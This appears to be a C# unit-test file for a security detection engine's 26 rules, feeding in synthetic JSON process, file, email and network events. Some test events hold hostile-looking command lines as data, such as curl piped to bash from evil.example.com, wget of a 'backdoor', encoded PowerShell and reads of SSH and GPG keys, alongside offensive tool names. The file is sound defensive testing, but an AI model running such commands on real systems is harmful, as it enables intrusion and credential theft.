using System.Text.Json;
using FluentAssertions;
using Microsoft.Extensions.Logging.Abstractions;
using Phalanx.Correlator.Engine;
using Xunit;

namespace Phalanx.Tests.Unit;

// ─────────────────────────────────────────────────────────────────────────────
// RuleMatchTests
// ─────────────────────────────────────────────────────────────────────────────
// Validates every production rule in rules/ fires on the correct synthetic
// event and stays silent on events that should not match.
//
// Safety: no real processes are launched, no network calls are made, and no
// disk writes occur. Every event is a fabricated JSON blob evaluated entirely
// in-memory by the RuleEngine.
//
// Run with: dotnet test --filter "FullyQualifiedName~RuleMatchTests"
// ─────────────────────────────────────────────────────────────────────────────

/// <summary>
/// Loads rules once per test session by walking up from the test binary
/// to find the rules/ directory, mirroring how the Correlator locates it.
/// </summary>
public sealed class RulesFixture
{
    public IReadOnlyList<Rule> All { get; }

    public RulesFixture()
    {
        var dir = LocateDir("rules");
        All = new RuleLoader(NullLogger.Instance).LoadFromDirectory(dir);
    }

    /// <summary>Returns a fresh single-rule RuleEngine for the given rule ID.</summary>
    public RuleEngine Engine(string ruleId)
    {
        var rule = All.SingleOrDefault(r => r.Id == ruleId)
            ?? throw new InvalidOperationException(
                $"Rule '{ruleId}' not found. Loaded {All.Count} rules: {string.Join(", ", All.Select(r => r.Id))}");
        return new RuleEngine(new[] { rule }, NullLogger.Instance);
    }

    private static string LocateDir(string name)
    {
        var dir = new DirectoryInfo(AppContext.BaseDirectory);
        for (int i = 0; i < 10 && dir is not null; i++, dir = dir.Parent)
        {
            var candidate = Path.Combine(dir.FullName, name);
            if (Directory.Exists(candidate)) return candidate;
        }
        throw new DirectoryNotFoundException(
            $"Could not find '{name}/' directory by walking up from {AppContext.BaseDirectory}");
    }
}

public sealed class RuleMatchTests : IClassFixture<RulesFixture>
{
    private readonly RulesFixture _fx;

    public RuleMatchTests(RulesFixture fx) => _fx = fx;

    private static JsonElement J(string json) => JsonDocument.Parse(json).RootElement;
    private static DateTime Now => DateTime.UtcNow;

    // ── Sanity: all 26 expected rule IDs loaded ───────────────────────────────

    [Fact]
    public void AllExpectedRuleIds_AreLoaded()
    {
        var expected = new[]
        {
            "PHX-001","PHX-002","PHX-003","PHX-004",
            "PHX-008","PHX-009",
            "PHX-010","PHX-011","PHX-012","PHX-013",
            "PHX-100","PHX-101","PHX-110","PHX-111",
            "PHX-200","PHX-201","PHX-202","PHX-203","PHX-204","PHX-205","PHX-206",
            "PHX-300","PHX-301","PHX-302","PHX-303","PHX-304",
        };
        var loaded = _fx.All.Select(r => r.Id).ToHashSet();
        expected.Should().OnlyContain(id => loaded.Contains(id),
            because: "every production rule must be present in the rules/ directory");
    }

    // ══════════════════════════════════════════════════════════════════════════
    // critical_tools.yml — PHX-001 … PHX-004
    // ══════════════════════════════════════════════════════════════════════════

    [Fact]
    public void PHX001_CredentialDumping_Fires_On_Mimikatz()
    {
        var engine = _fx.Engine("PHX-001");
        var evt = J("""{"event":{"action":"process_start"},"process":{"name":"mimikatz"}}""");
        engine.Evaluate(evt, Now, "e1").Should().ContainSingle(h => h.Rule.Id == "PHX-001");
    }

    [Fact]
    public void PHX001_CredentialDumping_DoesNotFire_On_SafeProcess()
    {
        var engine = _fx.Engine("PHX-001");
        var evt = J("""{"event":{"action":"process_start"},"process":{"name":"ls"}}""");
        engine.Evaluate(evt, Now, "e1").Should().BeEmpty();
    }

    [Fact]
    public void PHX002_ExploitationFramework_Fires_On_Msfconsole()
    {
        var engine = _fx.Engine("PHX-002");
        var evt = J("""{"event":{"action":"process_start"},"process":{"name":"msfconsole"}}""");
        engine.Evaluate(evt, Now, "e1").Should().ContainSingle(h => h.Rule.Id == "PHX-002");
    }

    [Fact]
    public void PHX002_ExploitationFramework_Fires_On_Sliver()
    {
        var engine = _fx.Engine("PHX-002");
        var evt = J("""{"event":{"action":"process_start"},"process":{"name":"sliver"}}""");
        engine.Evaluate(evt, Now, "e1").Should().ContainSingle(h => h.Rule.Id == "PHX-002");
    }

    [Fact]
    public void PHX002_ExploitationFramework_DoesNotFire_On_SafeProcess()
    {
        var engine = _fx.Engine("PHX-002");
        var evt = J("""{"event":{"action":"process_start"},"process":{"name":"vim"}}""");
        engine.Evaluate(evt, Now, "e1").Should().BeEmpty();
    }

    [Fact]
    public void PHX003_LateralMovement_Fires_On_Psexec()
    {
        var engine = _fx.Engine("PHX-003");
        var evt = J("""{"event":{"action":"process_start"},"process":{"name":"psexec"}}""");
        engine.Evaluate(evt, Now, "e1").Should().ContainSingle(h => h.Rule.Id == "PHX-003");
    }

    [Fact]
    public void PHX003_LateralMovement_DoesNotFire_On_Ssh()
    {
        // ssh is a legitimate tool not in the lateral-movement list
        var engine = _fx.Engine("PHX-003");
        var evt = J("""{"event":{"action":"process_start"},"process":{"name":"ssh"}}""");
        engine.Evaluate(evt, Now, "e1").Should().BeEmpty();
    }

    [Fact]
    public void PHX004_BruteForce_Fires_On_Hydra()
    {
        var engine = _fx.Engine("PHX-004");
        var evt = J("""{"event":{"action":"process_start"},"process":{"name":"hydra"}}""");
        engine.Evaluate(evt, Now, "e1").Should().ContainSingle(h => h.Rule.Id == "PHX-004");
    }

    [Fact]
    public void PHX004_BruteForce_DoesNotFire_On_John()
    {
        // john (the ripper) is not in this rule's list
        var engine = _fx.Engine("PHX-004");
        var evt = J("""{"event":{"action":"process_start"},"process":{"name":"john"}}""");
        engine.Evaluate(evt, Now, "e1").Should().BeEmpty();
    }

    // ══════════════════════════════════════════════════════════════════════════
    // discovery.yml — PHX-008, PHX-009
    // ══════════════════════════════════════════════════════════════════════════

    [Fact]
    public void PHX008_Discovery_Fires_On_Whoami()
    {
        var engine = _fx.Engine("PHX-008");
        var evt = J("""{"event":{"action":"process_start"},"process":{"name":"whoami"}}""");
        engine.Evaluate(evt, Now, "e1").Should().ContainSingle(h => h.Rule.Id == "PHX-008");
    }

    [Fact]
    public void PHX008_Discovery_DoesNotFire_On_Ls()
    {
        var engine = _fx.Engine("PHX-008");
        var evt = J("""{"event":{"action":"process_start"},"process":{"name":"ls"}}""");
        engine.Evaluate(evt, Now, "e1").Should().BeEmpty();
    }

    [Fact]
    public void PHX009_NetworkScan_Fires_On_Nmap()
    {
        var engine = _fx.Engine("PHX-009");
        var evt = J("""{"event":{"action":"process_start"},"process":{"name":"nmap"}}""");
        engine.Evaluate(evt, Now, "e1").Should().ContainSingle(h => h.Rule.Id == "PHX-009");
    }

    [Fact]
    public void PHX009_NetworkScan_DoesNotFire_On_Curl()
    {
        var engine = _fx.Engine("PHX-009");
        var evt = J("""{"event":{"action":"process_start"},"process":{"name":"curl"}}""");
        engine.Evaluate(evt, Now, "e1").Should().BeEmpty();
    }

    // ══════════════════════════════════════════════════════════════════════════
    // behavior.yml — PHX-010 … PHX-013
    // ══════════════════════════════════════════════════════════════════════════

    [Fact]
    public void PHX010_WebServerShell_Fires_On_BashFromNginx()
    {
        var engine = _fx.Engine("PHX-010");
        var evt = J("""
            {"event":{"action":"process_start"},
             "process":{"name":"bash","parent":{"name":"nginx"}}}""");
        engine.Evaluate(evt, Now, "e1").Should().ContainSingle(h => h.Rule.Id == "PHX-010");
    }

    [Fact]
    public void PHX010_WebServerShell_DoesNotFire_On_BashFromSystemd()
    {
        // systemd is not in the web-server parent list
        var engine = _fx.Engine("PHX-010");
        var evt = J("""
            {"event":{"action":"process_start"},
             "process":{"name":"bash","parent":{"name":"systemd"}}}""");
        engine.Evaluate(evt, Now, "e1").Should().BeEmpty();
    }

    [Fact]
    public void PHX010_WebServerShell_DoesNotFire_On_NonShellChildOfNginx()
    {
        // python3 is not in the shell child list for PHX-010 — only sh/bash/dash/zsh/ash
        var engine = _fx.Engine("PHX-010");
        var evt = J("""
            {"event":{"action":"process_start"},
             "process":{"name":"python3","parent":{"name":"nginx"}}}""");
        engine.Evaluate(evt, Now, "e1").Should().BeEmpty();
    }

    [Fact]
    public void PHX011_EncodedPowershell_Fires_On_EncodedCommand()
    {
        var engine = _fx.Engine("PHX-011");
        var evt = J("""
            {"event":{"action":"process_start"},
             "process":{"name":"powershell",
                        "command_line":"powershell -EncodedCommand aGVsbG8gd29ybGQ="}}""");
        engine.Evaluate(evt, Now, "e1").Should().ContainSingle(h => h.Rule.Id == "PHX-011");
    }

    [Fact]
    public void PHX011_EncodedPowershell_Fires_On_ShortFlag()
    {
        var engine = _fx.Engine("PHX-011");
        var evt = J("""
            {"event":{"action":"process_start"},
             "process":{"name":"pwsh","command_line":"pwsh -enc aGVsbG8="}}""");
        engine.Evaluate(evt, Now, "e1").Should().ContainSingle(h => h.Rule.Id == "PHX-011");
    }

    [Fact]
    public void PHX011_EncodedPowershell_DoesNotFire_On_PlainScript()
    {
        var engine = _fx.Engine("PHX-011");
        var evt = J("""
            {"event":{"action":"process_start"},
             "process":{"name":"powershell","command_line":"powershell -File ./deploy.ps1"}}""");
        engine.Evaluate(evt, Now, "e1").Should().BeEmpty();
    }

    [Fact]
    public void PHX012_CurlPipedToShell_Fires_On_RegexMatch()
    {
        var engine = _fx.Engine("PHX-012");
        var evt = J("""
            {"event":{"action":"process_start"},
             "process":{"command_line":"bash -c 'curl https://evil.example.com/s | bash'"}}""");
        engine.Evaluate(evt, Now, "e1").Should().ContainSingle(h => h.Rule.Id == "PHX-012");
    }

    [Fact]
    public void PHX012_CurlPipedToShell_DoesNotFire_On_SafeDownload()
    {
        // curl downloading to a file — no pipe to shell
        var engine = _fx.Engine("PHX-012");
        var evt = J("""
            {"event":{"action":"process_start"},
             "process":{"command_line":"curl https://example.com/file.zip -o /tmp/file.zip"}}""");
        engine.Evaluate(evt, Now, "e1").Should().BeEmpty();
    }

    [Fact]
    public void PHX013_SuspiciousDownload_Fires_On_WgetHttp()
    {
        var engine = _fx.Engine("PHX-013");
        var evt = J("""
            {"event":{"action":"process_start"},
             "process":{"name":"wget","command_line":"wget http://10.0.0.1/tool"}}""");
        engine.Evaluate(evt, Now, "e1").Should().ContainSingle(h => h.Rule.Id == "PHX-013");
    }

    [Fact]
    public void PHX013_SuspiciousDownload_DoesNotFire_On_LocalPath()
    {
        // no http:// or https:// — local file copy, not a download
        var engine = _fx.Engine("PHX-013");
        var evt = J("""
            {"event":{"action":"process_start"},
             "process":{"name":"wget","command_line":"wget /local/share/file"}}""");
        engine.Evaluate(evt, Now, "e1").Should().BeEmpty();
    }

    // ══════════════════════════════════════════════════════════════════════════
    // correlation.yml — PHX-100, PHX-101 (burst), PHX-110, PHX-111 (sequence)
    // ══════════════════════════════════════════════════════════════════════════

    [Fact]
    public void PHX100_DiscoveryBurst_FiresOnThirdEvent()
    {
        // threshold = 3, window = 60s, group_by = agent.id
        var engine = _fx.Engine("PHX-100");
        const string agentId = "agent-phx100-pos";
        var evt = J($$"""{"event":{"action":"process_start"},"process":{"name":"whoami"},"agent":{"id":"{{agentId}}"}}""");

        engine.Evaluate(evt, Now, "e1").Should().BeEmpty("first event below threshold");
        engine.Evaluate(evt, Now, "e2").Should().BeEmpty("second event below threshold");
        engine.Evaluate(evt, Now, "e3").Should().ContainSingle(h => h.Rule.Id == "PHX-100",
            "third event reaches threshold of 3");
    }

    [Fact]
    public void PHX100_DiscoveryBurst_DoesNotFire_BelowThreshold()
    {
        var engine = _fx.Engine("PHX-100");
        const string agentId = "agent-phx100-neg";
        var evt = J($$"""{"event":{"action":"process_start"},"process":{"name":"id"},"agent":{"id":"{{agentId}}"}}""");

        engine.Evaluate(evt, Now, "e1").Should().BeEmpty();
        engine.Evaluate(evt, Now, "e2").Should().BeEmpty("only 2 events, threshold is 3");
    }

    [Fact]
    public void PHX100_DiscoveryBurst_CountsSeparateAgentsIndependently()
    {
        var engine = _fx.Engine("PHX-100");
        var evtA = J("""{"event":{"action":"process_start"},"process":{"name":"hostname"},"agent":{"id":"agent-A"}}""");
        var evtB = J("""{"event":{"action":"process_start"},"process":{"name":"hostname"},"agent":{"id":"agent-B"}}""");

        engine.Evaluate(evtA, Now, "e1").Should().BeEmpty();
        engine.Evaluate(evtA, Now, "e2").Should().BeEmpty();
        // Agent-B's first event should not contribute to agent-A's count
        engine.Evaluate(evtB, Now, "e3").Should().BeEmpty("different agent.id — separate window");
    }

    [Fact]
    public void PHX101_NetworkDiscoveryBurst_FiresOnSecondEvent()
    {
        // threshold = 2, window = 120s
        var engine = _fx.Engine("PHX-101");
        const string agentId = "agent-phx101-pos";
        var evt = J($$"""{"event":{"action":"process_start"},"process":{"name":"nmap"},"agent":{"id":"{{agentId}}"}}""");

        engine.Evaluate(evt, Now, "e1").Should().BeEmpty("first event below threshold");
        engine.Evaluate(evt, Now, "e2").Should().ContainSingle(h => h.Rule.Id == "PHX-101",
            "second event reaches threshold of 2");
    }

    [Fact]
    public void PHX101_NetworkDiscoveryBurst_DoesNotFire_OnFirstEvent()
    {
        var engine = _fx.Engine("PHX-101");
        var evt = J("""{"event":{"action":"process_start"},"process":{"name":"masscan"},"agent":{"id":"agent-phx101-neg"}}""");
        engine.Evaluate(evt, Now, "e1").Should().BeEmpty();
    }

    [Fact]
    public void PHX110_ReconThenDownload_Fires_InOrder()
    {
        // sequence: nmap → wget http://
        var engine = _fx.Engine("PHX-110");
        const string agentId = "agent-phx110-pos";
        var scan     = J($$"""{"event":{"action":"process_start"},"process":{"name":"nmap"},"agent":{"id":"{{agentId}}"}}""");
        var download = J($$"""{"event":{"action":"process_start"},"process":{"name":"wget","command_line":"wget http://10.0.0.1/backdoor"},"agent":{"id":"{{agentId}}"}}""");

        engine.Evaluate(scan,     Now,              "e1").Should().BeEmpty("scan alone is not the sequence");
        engine.Evaluate(download, Now.AddSeconds(5), "e2")
              .Should().ContainSingle(h => h.Rule.Id == "PHX-110", "download after scan completes the sequence");
    }

    [Fact]
    public void PHX110_ReconThenDownload_DoesNotFire_OutOfOrder()
    {
        var engine = _fx.Engine("PHX-110");
        const string agentId = "agent-phx110-neg";
        var download = J($$"""{"event":{"action":"process_start"},"process":{"name":"curl","command_line":"curl http://evil.com/tool"},"agent":{"id":"{{agentId}}"}}""");
        var scan     = J($$"""{"event":{"action":"process_start"},"process":{"name":"masscan"},"agent":{"id":"{{agentId}}"}}""");

        engine.Evaluate(download, Now,              "e1").Should().BeEmpty();
        engine.Evaluate(scan,     Now.AddSeconds(5), "e2").Should().BeEmpty("scan after download is wrong order");
    }

    [Fact]
    public void PHX111_DiscoveryThenPrivesc_Fires_InOrder()
    {
        var engine = _fx.Engine("PHX-111");
        const string agentId = "agent-phx111-pos";
        var discovery = J($$"""{"event":{"action":"process_start"},"process":{"name":"whoami"},"agent":{"id":"{{agentId}}"}}""");
        var privesc   = J($$"""{"event":{"action":"process_start"},"process":{"name":"sudo"},"agent":{"id":"{{agentId}}"}}""");

        engine.Evaluate(discovery, Now,              "e1").Should().BeEmpty();
        engine.Evaluate(privesc,   Now.AddSeconds(3), "e2")
              .Should().ContainSingle(h => h.Rule.Id == "PHX-111");
    }

    [Fact]
    public void PHX111_DiscoveryThenPrivesc_DoesNotFire_OutOfOrder()
    {
        var engine = _fx.Engine("PHX-111");
        const string agentId = "agent-phx111-neg";
        var sudo      = J($$"""{"event":{"action":"process_start"},"process":{"name":"sudo"},"agent":{"id":"{{agentId}}"}}""");
        var discovery = J($$"""{"event":{"action":"process_start"},"process":{"name":"id"},"agent":{"id":"{{agentId}}"}}""");

        engine.Evaluate(sudo,      Now,              "e1").Should().BeEmpty();
        engine.Evaluate(discovery, Now.AddSeconds(2), "e2").Should().BeEmpty("discovery after sudo is wrong order");
    }

    // ══════════════════════════════════════════════════════════════════════════
    // email_phishing.yml — PHX-200 … PHX-206
    // ══════════════════════════════════════════════════════════════════════════

    [Fact]
    public void PHX200_EmailClientShell_Fires_On_CorrectDataset()
    {
        var engine = _fx.Engine("PHX-200");
        var evt = J("""{"event":{"action":"email_client_shell","dataset":"phalanx.sentinel.email"}}""");
        engine.Evaluate(evt, Now, "e1").Should().ContainSingle(h => h.Rule.Id == "PHX-200");
    }

    [Fact]
    public void PHX200_EmailClientShell_DoesNotFire_On_WrongDataset()
    {
        var engine = _fx.Engine("PHX-200");
        var evt = J("""{"event":{"action":"email_client_shell","dataset":"phalanx.sentinel.process"}}""");
        engine.Evaluate(evt, Now, "e1").Should().BeEmpty("wrong dataset should not trigger PHX-200");
    }

    [Fact]
    public void PHX201_DocViewerShell_Fires_On_SofficeSpawningBash()
    {
        var engine = _fx.Engine("PHX-201");
        var evt = J("""
            {"event":{"action":"process_start"},
             "process":{"name":"bash","parent":{"name":"soffice"}}}""");
        engine.Evaluate(evt, Now, "e1").Should().ContainSingle(h => h.Rule.Id == "PHX-201");
    }

    [Fact]
    public void PHX201_DocViewerShell_Fires_On_LibreofficeSpawningWget()
    {
        var engine = _fx.Engine("PHX-201");
        var evt = J("""
            {"event":{"action":"process_start"},
             "process":{"name":"wget","parent":{"name":"libreoffice"}}}""");
        engine.Evaluate(evt, Now, "e1").Should().ContainSingle(h => h.Rule.Id == "PHX-201");
    }

    [Fact]
    public void PHX201_DocViewerShell_DoesNotFire_On_SafeParent()
    {
        // gedit is a text editor, not a document viewer in the list
        var engine = _fx.Engine("PHX-201");
        var evt = J("""
            {"event":{"action":"process_start"},
             "process":{"name":"bash","parent":{"name":"gedit"}}}""");
        engine.Evaluate(evt, Now, "e1").Should().BeEmpty();
    }

    [Fact]
    public void PHX202_SuspiciousAttachment_Fires_On_CorrectDataset()
    {
        var engine = _fx.Engine("PHX-202");
        var evt = J("""{"event":{"action":"suspicious_attachment","dataset":"phalanx.sentinel.email"}}""");
        engine.Evaluate(evt, Now, "e1").Should().ContainSingle(h => h.Rule.Id == "PHX-202");
    }

    [Fact]
    public void PHX202_SuspiciousAttachment_DoesNotFire_On_WrongDataset()
    {
        var engine = _fx.Engine("PHX-202");
        var evt = J("""{"event":{"action":"suspicious_attachment","dataset":"phalanx.sentinel.process"}}""");
        engine.Evaluate(evt, Now, "e1").Should().BeEmpty();
    }

    [Fact]
    public void PHX203_NonMailClientSmtp_Fires_On_PythonToPort25()
    {
        // python3 is not a known mail client → rule fires
        var engine = _fx.Engine("PHX-203");
        var evt = J("""
            {"event":{"action":"network_connection","dataset":"phalanx.sentinel.network"},
             "destination":{"port":25},
             "process":{"name":"python3"}}""");
        engine.Evaluate(evt, Now, "e1").Should().ContainSingle(h => h.Rule.Id == "PHX-203");
    }

    [Fact]
    public void PHX203_NonMailClientSmtp_Fires_On_Port587()
    {
        var engine = _fx.Engine("PHX-203");
        var evt = J("""
            {"event":{"action":"network_connection","dataset":"phalanx.sentinel.network"},
             "destination":{"port":587},
             "process":{"name":"curl"}}""");
        engine.Evaluate(evt, Now, "e1").Should().ContainSingle(h => h.Rule.Id == "PHX-203");
    }

    [Fact]
    public void PHX203_NonMailClientSmtp_DoesNotFire_When_ThunderbirdConnectsToSmtp()
    {
        // thunderbird IS a known mail client → process.name|not excludes it
        var engine = _fx.Engine("PHX-203");
        var evt = J("""
            {"event":{"action":"network_connection","dataset":"phalanx.sentinel.network"},
             "destination":{"port":25},
             "process":{"name":"thunderbird"}}""");
        engine.Evaluate(evt, Now, "e1").Should().BeEmpty("thunderbird is excluded by process.name|not");
    }

    [Fact]
    public void PHX203_NonMailClientSmtp_DoesNotFire_On_NonSmtpPort()
    {
        var engine = _fx.Engine("PHX-203");
        var evt = J("""
            {"event":{"action":"network_connection","dataset":"phalanx.sentinel.network"},
             "destination":{"port":443},
             "process":{"name":"python3"}}""");
        engine.Evaluate(evt, Now, "e1").Should().BeEmpty("port 443 is not in the SMTP port list");
    }

    [Fact]
    public void PHX204_EmailClientCredentialAccess_Fires_On_ThunderbirdReadingSshKey()
    {
        var engine = _fx.Engine("PHX-204");
        var evt = J("""
            {"event":{"action":"file_open","dataset":"phalanx.sentinel.file"},
             "process":{"name":"thunderbird"},
             "file":{"path":"/home/user/.ssh/id_rsa"}}""");
        engine.Evaluate(evt, Now, "e1").Should().ContainSingle(h => h.Rule.Id == "PHX-204");
    }

    [Fact]
    public void PHX204_EmailClientCredentialAccess_Fires_On_GpgKeyring()
    {
        var engine = _fx.Engine("PHX-204");
        var evt = J("""
            {"event":{"action":"file_open","dataset":"phalanx.sentinel.file"},
             "process":{"name":"evolution"},
             "file":{"path":"/home/user/.gnupg/secring.gpg"}}""");
        engine.Evaluate(evt, Now, "e1").Should().ContainSingle(h => h.Rule.Id == "PHX-204");
    }

    [Fact]
    public void PHX204_EmailClientCredentialAccess_DoesNotFire_On_NonMailClientProcess()
    {
        // gedit reading .ssh — suspicious but not this rule's scope
        var engine = _fx.Engine("PHX-204");
        var evt = J("""
            {"event":{"action":"file_open","dataset":"phalanx.sentinel.file"},
             "process":{"name":"gedit"},
             "file":{"path":"/home/user/.ssh/id_rsa"}}""");
        engine.Evaluate(evt, Now, "e1").Should().BeEmpty("gedit is not in the mail client list");
    }

    [Fact]
    public void PHX204_EmailClientCredentialAccess_DoesNotFire_On_SafeFilePath()
    {
        var engine = _fx.Engine("PHX-204");
        var evt = J("""
            {"event":{"action":"file_open","dataset":"phalanx.sentinel.file"},
             "process":{"name":"thunderbird"},
             "file":{"path":"/home/user/Documents/newsletter.html"}}""");
        engine.Evaluate(evt, Now, "e1").Should().BeEmpty("safe file path should not trigger PHX-204");
    }

    [Fact]
    public void PHX205_SmtpAnomaly_Fires_On_CorrectDataset()
    {
        var engine = _fx.Engine("PHX-205");
        var evt = J("""{"event":{"action":"smtp_anomaly","dataset":"phalanx.sentinel.email"}}""");
        engine.Evaluate(evt, Now, "e1").Should().ContainSingle(h => h.Rule.Id == "PHX-205");
    }

    [Fact]
    public void PHX205_SmtpAnomaly_DoesNotFire_On_WrongDataset()
    {
        var engine = _fx.Engine("PHX-205");
        var evt = J("""{"event":{"action":"smtp_anomaly","dataset":"phalanx.sentinel.process"}}""");
        engine.Evaluate(evt, Now, "e1").Should().BeEmpty();
    }

    [Fact]
    public void PHX206_PhishingChain_Fires_InOrder()
    {
        // sequence: email client child process → shell on same host, within 300s
        var engine = _fx.Engine("PHX-206");
        const string host = "ws-phx206-pos";
        var emailChild = J($$"""
            {"event":{"action":"process_start"},
             "process":{"parent":{"name":"thunderbird"},"name":"python3"},
             "host":{"hostname":"{{host}}"}}""");
        var shell = J($$"""
            {"event":{"action":"process_start"},
             "process":{"name":"bash"},
             "host":{"hostname":"{{host}}"}}""");

        engine.Evaluate(emailChild, Now,               "e1").Should().BeEmpty("first stage alone is not enough");
        engine.Evaluate(shell,      Now.AddSeconds(10), "e2")
              .Should().ContainSingle(h => h.Rule.Id == "PHX-206", "shell after email child completes the phishing chain");
    }

    [Fact]
    public void PHX206_PhishingChain_DoesNotFire_OutOfOrder()
    {
        var engine = _fx.Engine("PHX-206");
        const string host = "ws-phx206-neg";
        var shell = J($$"""
            {"event":{"action":"process_start"},
             "process":{"name":"bash"},
             "host":{"hostname":"{{host}}"}}""");
        var emailChild = J($$"""
            {"event":{"action":"process_start"},
             "process":{"parent":{"name":"evolution"}},
             "host":{"hostname":"{{host}}"}}""");

        engine.Evaluate(shell,      Now,              "e1").Should().BeEmpty();
        engine.Evaluate(emailChild, Now.AddSeconds(5), "e2").Should().BeEmpty("wrong stage order — sequence must not fire");
    }

    [Fact]
    public void PHX206_PhishingChain_DoesNotFire_AcrossDifferentHosts()
    {
        var engine = _fx.Engine("PHX-206");
        var emailChild = J("""{"event":{"action":"process_start"},"process":{"parent":{"name":"mutt"}},"host":{"hostname":"host-A"}}""");
        var shell      = J("""{"event":{"action":"process_start"},"process":{"name":"sh"},               "host":{"hostname":"host-B"}}""");

        engine.Evaluate(emailChild, Now,              "e1").Should().BeEmpty();
        engine.Evaluate(shell,      Now.AddSeconds(5), "e2").Should().BeEmpty("different host.hostname — separate sequence group");
    }

    // ══════════════════════════════════════════════════════════════════════════
    // network_sensor.yml — PHX-300 … PHX-304
    // ══════════════════════════════════════════════════════════════════════════

    [Fact]
    public void PHX300_PortScan_Fires_On_SensorDataset()
    {
        var engine = _fx.Engine("PHX-300");
        var evt = J("""{"event":{"action":"port_scan_detected","dataset":"phalanx.sensor.scan"}}""");
        engine.Evaluate(evt, Now, "e1").Should().ContainSingle(h => h.Rule.Id == "PHX-300");
    }

    [Fact]
    public void PHX300_PortScan_DoesNotFire_On_SentinelDataset()
    {
        var engine = _fx.Engine("PHX-300");
        var evt = J("""{"event":{"action":"port_scan_detected","dataset":"phalanx.sentinel.network"}}""");
        engine.Evaluate(evt, Now, "e1").Should().BeEmpty("sentinel dataset is not the sensor dataset");
    }

    [Fact]
    public void PHX301_C2Beacon_Fires_On_SensorDataset()
    {
        var engine = _fx.Engine("PHX-301");
        var evt = J("""{"event":{"action":"beacon_detected","dataset":"phalanx.sensor.beacon"}}""");
        engine.Evaluate(evt, Now, "e1").Should().ContainSingle(h => h.Rule.Id == "PHX-301");
    }

    [Fact]
    public void PHX301_C2Beacon_DoesNotFire_On_WrongAction()
    {
        var engine = _fx.Engine("PHX-301");
        var evt = J("""{"event":{"action":"port_scan_detected","dataset":"phalanx.sensor.beacon"}}""");
        engine.Evaluate(evt, Now, "e1").Should().BeEmpty();
    }

    [Fact]
    public void PHX302_DgaDns_Fires_When_ScoreAboveThreshold()
    {
        var engine = _fx.Engine("PHX-302");
        var evt = J("""{"event":{"action":"dns_query","dataset":"phalanx.sensor.dns"},"dns":{"dga_score":0.85}}""");
        engine.Evaluate(evt, Now, "e1").Should().ContainSingle(h => h.Rule.Id == "PHX-302");
    }

    [Fact]
    public void PHX302_DgaDns_DoesNotFire_When_ScoreBelowThreshold()
    {
        var engine = _fx.Engine("PHX-302");
        var evt = J("""{"event":{"action":"dns_query","dataset":"phalanx.sensor.dns"},"dns":{"dga_score":0.5}}""");
        engine.Evaluate(evt, Now, "e1").Should().BeEmpty("score 0.5 is below the 0.7 threshold");
    }

    [Fact]
    public void PHX302_DgaDns_DoesNotFire_AtExactThreshold()
    {
        // gt (strictly greater than) — 0.7 itself must not fire
        var engine = _fx.Engine("PHX-302");
        var evt = J("""{"event":{"action":"dns_query","dataset":"phalanx.sensor.dns"},"dns":{"dga_score":0.7}}""");
        engine.Evaluate(evt, Now, "e1").Should().BeEmpty("0.7 is the threshold, not above it — gt is strict");
    }

    [Fact]
    public void PHX303_DnsTunnel_Fires_On_TunnelFlag()
    {
        var engine = _fx.Engine("PHX-303");
        var evt = J("""{"event":{"action":"dns_query","dataset":"phalanx.sensor.dns"},"dns":{"is_tunnel":"true"}}""");
        engine.Evaluate(evt, Now, "e1").Should().ContainSingle(h => h.Rule.Id == "PHX-303");
    }

    [Fact]
    public void PHX303_DnsTunnel_DoesNotFire_When_FlagIsFalse()
    {
        var engine = _fx.Engine("PHX-303");
        var evt = J("""{"event":{"action":"dns_query","dataset":"phalanx.sensor.dns"},"dns":{"is_tunnel":"false"}}""");
        engine.Evaluate(evt, Now, "e1").Should().BeEmpty();
    }

    [Fact]
    public void PHX304_NewDevice_Fires_On_DhcpRequest()
    {
        var engine = _fx.Engine("PHX-304");
        var evt = J("""{"event":{"action":"dhcp_request","dataset":"phalanx.sensor.dhcp"}}""");
        engine.Evaluate(evt, Now, "e1").Should().ContainSingle(h => h.Rule.Id == "PHX-304");
    }

    [Fact]
    public void PHX304_NewDevice_DoesNotFire_On_WrongDataset()
    {
        var engine = _fx.Engine("PHX-304");
        var evt = J("""{"event":{"action":"dhcp_request","dataset":"phalanx.sentinel.network"}}""");
        engine.Evaluate(evt, Now, "e1").Should().BeEmpty();
    }
}
